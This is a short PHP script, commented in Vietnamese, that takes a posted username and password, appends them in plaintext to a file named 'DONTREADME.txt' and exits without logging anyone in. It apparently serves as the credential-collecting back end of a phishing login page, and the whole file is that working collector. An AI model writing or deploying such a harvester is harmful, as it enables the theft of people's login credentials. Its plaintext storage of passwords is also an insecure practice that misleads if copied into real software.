<?php
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Đường dẫn tới file "DONTREADME.txt"
    $file = 'DONTREADME.txt';

    // Chuỗi dữ liệu muốn ghi vào file
    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";

    // Ghi dữ liệu vào file
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    
    exit;
}
?>
